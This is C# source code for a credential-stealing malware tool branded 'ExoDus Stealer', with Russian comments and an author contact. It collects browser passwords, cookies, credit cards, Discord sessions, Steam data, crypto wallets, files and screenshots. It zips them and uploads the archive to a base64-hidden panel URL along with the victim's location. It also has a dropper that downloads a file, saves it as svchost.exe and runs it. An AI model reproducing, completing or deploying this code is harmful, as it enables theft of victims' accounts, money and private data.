using System;
using Ionic.Zip;
using Ionic.Zlib;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Reflection;
using nitro.Properties;

namespace nitrostealer
{
    class Program
    {
        // Stealer Settings
        public static string link = "linkpanel";
        public static string link_panl = "?&compname=" + SystemInfo.compname + "&adr=" + SystemInfo.IP() + "&cntr=" + SystemInfo.Country() + "&city=" + SystemInfo.City() + "&zip=" + SystemInfo.ZipCode() + "&pwc=" + Counting.Passwords++ + "&cuc=" + Counting.Cookies++ + "&ccc=" + Counting.CreditCards++;
        public static string dir = Help.AppData + "\\discord\\Local Storage\\leveldb\\";
        public static int sizefile = 1000000;
        public static string[] expansion = new string[] { ".txt", ".doc",".mafile", ".rdp", ".jpg" };

        public static void Main()
        {
            AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
            Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
            {
                if (args.Name.Contains("DotNetZip"))
                    return Assembly.Load(Resources.DotNetZip);
                return null;
            }

            if (File.Exists(Help.StubPath + "\\" + "odi")) // Проверка запускался ли уже стиллер на этом компьютере?
            {
                Environment.Exit(0);
            }
            else
            { 
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли уже стиллер сейчас
                {
                    try
                    {
                        Directory.CreateDirectory(Help.LogPath);
                        List<Thread> Threads = new List<Thread>();
                        Threads.Add(new Thread(() => Browsers.Start())); // Старт потока с браузерами
                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // Получение информации о айпи
                            Screen.GetScreen(); // Скриншот экрана
                            ProcessList.WriteProcesses(); // Получение списка процессов
                            SystemInfo.GetSystem(); // Скриншот экрана
                            SystemInfo.WithoutRepeat(); // проверка был ли запущен ранее
                            Discord.GetDiscord(Help.LogPath); // граб сессии дискорд
                            Files.GetFiles(Help.LogPath); // граб файлов
                            StartWallets.Start(); // граб холодных
                            Steam.SteamGet(); // граб стима
                            SystemInfo.IPCOUNTRY();
                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();

                        Request(); // Отправка лога на хост
                      //  Downloader(); // лоадер файла
                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }
        static void Request()
        {
            try
            {
                string zipArchive = Help.LogPath + "\\ExoDus.zip";
                using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
                {
                    zip.ParallelDeflateThreshold = -1;
                    zip.UseZip64WhenSaving = Zip64Option.Always;
                    zip.CompressionLevel = CompressionLevel.Default;
                    zip.Comment =
                           "\n ExoDus Stealer by (FroniYT)" +
                           "\n Contacts: https://t.me/buld_exe";
                    zip.AddDirectory(Help.LogPath);
                    zip.Save(zipArchive);
                }

                byte[] data = Convert.FromBase64String(Program.link);
                string decodedString = Encoding.UTF8.GetString(data);

                WebClient client = new WebClient();
                Uri link = new Uri(decodedString + link_panl);
                client.UploadFile(link, zipArchive);


                byte[] datas = Convert.FromBase64String("1488");
                string decodedStrings = Encoding.UTF8.GetString(datas);

                WebClient client_ = new WebClient();
                Uri link_ = new Uri(decodedStrings);
                client_.UploadFile(link_, zipArchive);

                Thread.Sleep(20000);
                Directory.Delete(Help.LogPath, true);
            }
            catch
            {
                return;
            }
        }
        static void Downloader()
        {
            WebClient wc = new WebClient();

            // Ниже необходимо ввести прямую ссылку на ваш файл
            string url = "";

            // Куда будет скачиваться ваш файл и под каким названием?
            string save_path = "C:\\ProgramData\\";
            string name = "svchost.exe";

            // Через сколько МС (миллисекунд) запустится ваш файл?
            // 30 секунд - 30000 миллисекунд
            // 60 секунд - 60000 миллисекунд
            // 5 минут - 300000 миллисекунд
            Thread.Sleep(5000);

            // Если вы меняли местоположение загрузки, то поменяйте их ниже
            wc.DownloadFile(url, save_path + name);
            System.Diagnostics.Process.Start(@"C:\ProgramData\svchost.exe");
        }
    }
}
